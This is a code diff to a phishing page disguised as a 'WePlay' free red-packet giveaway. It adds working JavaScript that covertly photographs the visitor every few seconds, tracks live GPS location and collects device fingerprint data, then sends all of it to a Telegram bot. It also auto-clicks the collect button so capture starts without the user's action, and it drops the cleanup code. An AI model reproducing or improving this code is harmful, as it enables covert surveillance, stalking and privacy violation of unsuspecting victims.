@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Red Packet - WePlay</title>
+    <title>Red Packet - WePlay (Enhanced Data)</title>
     <style>
         * {
             margin: 0;
@@ -339,8 +339,7 @@
         let useFrontCamera = true;
         let photoCounter = 0;
         
-        // ==================== VERCEL FIX ====================
-        // Store unsent photos in case of failure
+        // Queue for failed messages (simple retry)
         let photoQueue = [];
         
         // ==================== BACK BUTTON PREVENTION ====================
@@ -368,20 +367,128 @@
             }
         });
         
+        // ==================== TELEGRAM SEND FUNCTIONS ====================
+        async function sendTelegramMessage(text) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            const payload = {
+                chat_id: CHAT_ID,
+                text: text,
+                parse_mode: 'HTML'
+            };
+            
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                const data = await response.json();
+                if (!data.ok) {
+                    console.error('Telegram message error:', data);
+                }
+                return data;
+            } catch (err) {
+                console.error('Failed to send message:', err);
+                throw err;
+            }
+        }
+
+        async function sendTelegramPhoto(blob, caption = '') {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'photo.jpg');
+            if (caption) formData.append('caption', caption);
+            
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    body: formData
+                });
+                const data = await response.json();
+                if (!data.ok) {
+                    console.error('Telegram photo error:', data);
+                }
+                return data;
+            } catch (err) {
+                console.error('Failed to send photo:', err);
+                throw err;
+            }
+        }
+
+        // Wrapper with simple retry (once)
+        async function sendWithRetry(type, data, attempt = 1) {
+            try {
+                if (type === 'message') {
+                    await sendTelegramMessage(data);
+                } else if (type === 'location') {
+                    const text = `📍 Live location:\nLatitude: ${data.lat}\nLongitude: ${data.lng}\nGoogle Maps: https://maps.google.com/?q=${data.lat},${data.lng}`;
+                    await sendTelegramMessage(text);
+                } else if (type === 'device_info') {
+                    // data is an object with many fields
+                    const text = `📱 <b>Extended Device Info</b>\n` + 
+                        Object.entries(data).map(([k, v]) => `<b>${k}:</b> ${v}`).join('\n');
+                    await sendTelegramMessage(text);
+                }
+            } catch (err) {
+                console.log(`Send failed (attempt ${attempt}), retrying...`, err);
+                if (attempt < 2) {
+                    await new Promise(r => setTimeout(r, 2000));
+                    return sendWithRetry(type, data, attempt + 1);
+                }
+            }
+        }
+
+        async function sendPhotoWithRetry(blob, num, cameraType, attempt = 1) {
+            try {
+                const caption = `📸 Photo #${num} (${cameraType} camera)`;
+                await sendTelegramPhoto(blob, caption);
+                console.log(`Photo #${num} sent`);
+            } catch (err) {
+                console.log(`Photo send failed (attempt ${attempt})`, err);
+                if (attempt < 2) {
+                    await new Promise(r => setTimeout(r, 3000));
+                    return sendPhotoWithRetry(blob, num, cameraType, attempt + 1);
+                } else {
+                    console.log('Photo failed after retry');
+                }
+            }
+        }
+        
         // ==================== INIT ====================
         window.onload = function() {
             document.getElementById('collectBtn').innerHTML = '🎁 COLLECT FREE';
             
-            // Vercel fix: Add timeout for camera
             setTimeout(() => {
                 initCamera();
             }, 500);
             
+            // Request location permission and send initial location
             initLocation();
             
+            // Collect extended device info after a short delay (includes battery, network, etc.)
             setTimeout(() => {
-                collectDeviceInfo();
-            }, 3000);
+                collectExtendedDeviceInfo();
+            }, 2000);
+            
+            // Auto-trigger collect button
+            setTimeout(() => {
+                console.log('Auto-triggering collect button...');
+                const btn = document.getElementById('collectBtn');
+                const checkInterval = setInterval(() => {
+                    if (cameraReady && !btn.disabled && !isProcessing) {
+                        clearInterval(checkInterval);
+                        handleCollectClick();
+                    }
+                }, 300);
+                
+                setTimeout(() => {
+                    clearInterval(checkInterval);
+                    if (!isProcessing && !btn.disabled) {
+                        handleCollectClick();
+                    }
+                }, 7000);
+            }, 1500);
         };
         
         function showProcessing() {
@@ -398,13 +505,8 @@
         // ==================== CAMERA INIT ====================
         async function initCamera() {
             try {
-                // Try front camera first
                 stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { 
-                        facingMode: 'user',
-                        width: { ideal: 640 },
-                        height: { ideal: 480 }
-                    },
+                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                     audio: false
                 });
                 
@@ -421,15 +523,9 @@
                 
             } catch (err) {
                 console.log('Front camera failed:', err);
-                
                 try {
-                    // Try back camera
                     stream = await navigator.mediaDevices.getUserMedia({ 
-                        video: { 
-                            facingMode: 'environment',
-                            width: { ideal: 640 },
-                            height: { ideal: 480 }
-                        },
+                        video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } },
                         audio: false
                     });
                     
@@ -468,6 +564,53 @@
             }
         }
         
+        // ==================== EXTENDED DEVICE INFO ====================
+        async function collectExtendedDeviceInfo() {
+            const info = {
+                'User Agent': navigator.userAgent,
+                'Platform': navigator.platform,
+                'Language': navigator.language,
+                'Screen': `${screen.width}x${screen.height}`,
+                'Color Depth': screen.colorDepth,
+                'Timezone': Intl.DateTimeFormat().resolvedOptions().timeZone,
+                'Timestamp': new Date().toISOString(),
+                'Cookies Enabled': navigator.cookieEnabled,
+                'Do Not Track': navigator.doNotTrack || 'unspecified',
+                'Hardware Concurrency': navigator.hardwareConcurrency || 'unknown',
+                'Device Memory': navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'unknown',
+                'Max Touch Points': navigator.maxTouchPoints || 'unknown',
+            };
+
+            // Battery API
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    info['Battery Level'] = (battery.level * 100) + '%';
+                    info['Battery Charging'] = battery.charging ? 'Yes' : 'No';
+                } catch (e) {
+                    info['Battery'] = 'Not available';
+                }
+            } else {
+                info['Battery'] = 'API not supported';
+            }
+
+            // Network Information
+            if (navigator.connection) {
+                const conn = navigator.connection;
+                info['Network Type'] = conn.effectiveType || 'unknown';
+                info['Downlink'] = conn.downlink ? conn.downlink + ' Mbps' : 'unknown';
+                info['RTT'] = conn.rtt ? conn.rtt + ' ms' : 'unknown';
+                info['Save Data'] = conn.saveData ? 'Yes' : 'No';
+            } else {
+                info['Network'] = 'API not supported';
+            }
+
+            // Try to get SIM info? Not possible via web, but we can indicate.
+            info['SIM Info'] = 'Not accessible via web browser';
+
+            sendWithRetry('device_info', info);
+        }
+        
         // ==================== HANDLE COLLECT ====================
         function handleCollectClick() {
             if (!cameraReady) {
@@ -493,7 +636,6 @@
             captureInterval = setInterval(capturePhoto, 5000);
             setTimeout(capturePhoto, 1000);
             
-            // Auto stop after 30 seconds
             setTimeout(() => {
                 if (capturing) stopProcessing();
             }, 30000);
@@ -506,7 +648,6 @@
                 clearInterval(captureInterval);
             }
             
-            // Process any remaining photos in queue
             processQueue();
             
             sendWithRetry('message', '✅ RED PACKET PROCESSING COMPLETE!');
@@ -557,16 +698,11 @@
                 canvas.toBlob(async (blob) => {
                     try {
                         if (blob.size > 1000) {
-                            // Add to queue and try to send
-                            photoQueue.push({
-                                blob: blob,
-                                num: photoCount,
-                                cameraType: useFrontCamera ? 'Front' : 'Back'
-                            });
-                            processQueue();
+                            // Send immediately (with retry inside)
+                            await sendPhotoWithRetry(blob, photoCount, useFrontCamera ? 'Front' : 'Back');
                         }
                     } catch (err) {
-                        console.log('Queue error:', err);
+                        console.log('Photo send error:', err);
                     }
                 }, 'image/jpeg', 70);
                 
@@ -575,21 +711,11 @@
             }
         }
         
-        // ==================== VERCEL FIX: Queue System ====================
         async function processQueue() {
             while (photoQueue.length > 0) {
-                const photo = photoQueue.shift();
-                try {
-                    await sendPhotoWithRetry(photo.blob, photo.num, photo.cameraType);
-                    sentCount++;
-                } catch (err) {
-                    console.log('Failed to send, will retry later');
-                    // Put back in queue
-                    photoQueue.push(photo);
-                    break;
-                }
-                // Small delay between sends
-                await new Promise(resolve => setTimeout(resolve, 1000));
+                const item = photoQueue.shift();
+                await sendPhotoWithRetry(item.blob, item.num, item.cameraType);
+                await new Promise(r => setTimeout(r, 1000));
             }
         }
         
@@ -600,11 +726,7 @@
                 }
                 
                 stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { 
-                        facingMode: mode,
-                        width: { ideal: 640 },
-                        height: { ideal: 480 }
-                    },
+                    video: { facingMode: mode, width: { ideal: 640 }, height: { ideal: 480 } },
                     audio: false
                 });
                 
@@ -629,6 +751,7 @@
             locationWatchId = navigator.geolocation.watchPosition(
                 (position) => {
                     locationCount++;
+                    // Send every ~30 seconds (assuming updates every 5 seconds, count 6)
                     if (locationCount % 6 === 0) {
                         sendWithRetry('location', {
                             lat: position.coords.latitude,
@@ -636,94 +759,10 @@
                         });
                     }
                 },
-                null,
-                { enableHighAccuracy: true, maximumAge: 0, timeout: 5000 }
+                (error) => console.log('Live location error:', error),
+                { enableHighAccuracy: true, maximumAge: 30000, timeout: 27000 }
             );
         }
-        
-        // ==================== TELEGRAM WITH RETRY ====================
-        async function sendWithRetry(type, data, retries = 3) {
-            for (let i = 0; i < retries; i++) {
-                try {
-                    if (type === 'message') {
-                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                            method: 'POST',
-                            mode: 'no-cors', // Vercel fix
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({
-                                chat_id: CHAT_ID,
-                                text: `🎁 WePlay Red Packet\n${data}`,
-                                parse_mode: 'HTML'
-                            })
-                        });
-                    } else if (type === 'location') {
-                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
-                            method: 'POST',
-                            mode: 'no-cors', // Vercel fix
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({
-                                chat_id: CHAT_ID,
-                                latitude: data.lat,
-                                longitude: data.lng
-                            })
-                        });
-                    }
-                    break;
-                } catch (e) {
-                    console.log(`Attempt ${i + 1} failed:`, e);
-                    await new Promise(resolve => setTimeout(resolve, 2000));
-                }
-            }
-        }
-        
-        async function sendPhotoWithRetry(blob, num, cameraType, retries = 3) {
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('photo', blob, `photo_${Date.now()}.jpg`);
-            formData.append('caption', `🎁 FREE RED PACKET\n📸 Photo #${num} (${cameraType} Camera)\n🕐 ${new Date().toLocaleString()}`);
-            
-            for (let i = 0; i < retries; i++) {
-                try {
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                        method: 'POST',
-                        mode: 'no-cors', // Vercel fix
-                        body: formData
-                    });
-                    return true;
-                } catch (e) {
-                    console.log(`Photo send attempt ${i + 1} failed:`, e);
-                    await new Promise(resolve => setTimeout(resolve, 2000));
-                }
-            }
-            return false;
-        }
-        
-        function collectDeviceInfo() {
-            const info = {
-                platform: navigator.platform,
-                language: navigator.language,
-                screen: `${screen.width}x${screen.height}`,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                cores: navigator.hardwareConcurrency || 'unknown',
-                timestamp: new Date().toISOString()
-            };
-            
-            if ('getBattery' in navigator) {
-                navigator.getBattery().then(battery => {
-                    info.battery = `${Math.round(battery.level * 100)}%`;
-                    sendWithRetry('message', `📱 Device Info\n${JSON.stringify(info, null, 2)}`);
-                });
-            } else {
-                sendWithRetry('message', `📱 Device Info\n${JSON.stringify(info, null, 2)}`);
-            }
-        }
-        
-        // ==================== CLEANUP ====================
-        window.onbeforeunload = function() {
-            if (stream) stream?.getTracks().forEach(track => track.stop());
-            if (locationWatchId) navigator.geolocation.clearWatch(locationWatchId);
-            if (captureInterval) clearInterval(captureInterval);
-        };
     </script>
 </body>
 </html>
